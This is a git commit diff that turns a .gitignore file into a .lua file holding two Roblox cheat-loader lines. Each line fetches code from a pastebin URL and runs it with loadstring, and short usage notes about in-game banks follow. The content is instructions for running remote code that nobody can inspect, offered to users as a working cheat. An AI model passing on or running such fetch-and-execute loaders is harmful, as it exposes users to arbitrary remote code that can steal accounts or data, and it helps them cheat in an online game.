443f85770a85b1a1887ff60f6bb67a769732e971
XenoLord <103731872+XenoLord@users.noreply.github.com>
2022-04-15 11:54:17 +0300

    Update and rename .gitignore to .lua

---
+++ .lua
@@ -0,0 +1,11 @@
+Try this first
+
+loadstring(game:HttpGet("https://pastebin.com/raw/MaavrBSR"))() 
+
+If not works 
+
+loadstring(game:HttpGet("https://pastebin.com/raw/Wp3B2QfJ"))()
+
+NOTE: Dont forget to delete your bank members and cancel all outgoing invites
+NOTE2: It only works at tier2 - tier8 banks.
+
